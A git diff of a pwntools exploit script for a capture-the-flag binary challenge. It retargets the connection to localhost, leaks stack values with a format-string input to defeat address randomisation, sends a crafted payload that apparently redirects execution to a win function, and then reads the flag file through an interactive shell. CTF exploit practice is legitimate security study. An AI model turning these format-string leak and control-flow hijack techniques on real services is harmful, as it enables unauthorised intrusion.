@@ -2,7 +2,7 @@ from pwn import *
 
 exe = context.binary = ELF('./s')
 
-io = remote('litctf.org', 31791) #exe.process()
+io = remote('localhost', 1337) #remote('litctf.org', 31791) #exe.process()
 
 io.sendline(b'%11$llu.%13$llu')
 # So winaddr starts with 0x000055XXXXX1e9
@@ -20,5 +20,6 @@ payload = fit({
 print(payload)
 
 io.sendline(payload)
-io.sendline(b'cat flag.txt')
+io.interactive()
+io.sendline(b'cat /chal/flag.txt')
 print(io.recvline())
